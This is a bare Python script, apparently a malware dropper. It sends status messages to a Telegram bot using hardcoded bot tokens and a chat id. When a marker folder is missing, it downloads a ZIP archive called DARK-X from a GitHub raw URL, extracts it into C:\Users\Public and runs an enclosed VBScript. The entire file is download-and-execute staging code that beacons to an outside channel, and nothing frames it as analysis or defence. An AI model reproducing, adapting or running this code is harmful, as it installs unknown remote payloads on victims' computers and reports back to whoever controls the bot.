import requests
req = requests.get('https://api.telegram.org/bot5391677559:AAHhIJJHDQ53iMsdJGFg2ID4aQynGUh_dd0/sendMessage?text=TEST&chat_id=5388862175')
import os
if os.path.exists(r"C:\Users\Public\RA3D") == False:
  import zipfile
  import tempfile
  import requests
  import os
  from subprocess import PIPE,Popen
  file = tempfile.TemporaryFile()
  filename = file.name + ".zip"
  file.close()
  req = requests.get('https://api.telegram.org/bot5335082169:AAHG-zQxrTPSPDblx1iG82G9SVSiujh31Cw/sendMessage?chat_id=5388862175&text=Downloading')
  req = requests.get('https://raw.githubusercontent.com/UQABXO/DARK-X/main/DARK-X.zip')
  file = open(filename, "wb")
  file.write(req.content)
  file.close()
  req = requests.get('https://api.telegram.org/bot5335082169:AAHG-zQxrTPSPDblx1iG82G9SVSiujh31Cw/sendMessage?chat_id=5388862175&text=Installing')


  with zipfile.ZipFile(filename, 'r') as zip_ref:
      zip_ref.extractall(r"C:\Users\Public")

  sub = os.system(r"C:\Users\Public\RA3D\First.vbs")
  req = requests.get('https://api.telegram.org/bot5335082169:AAHG-zQxrTPSPDblx1iG82G9SVSiujh31Cw/sendMessage?chat_id=5388862175&text=True')
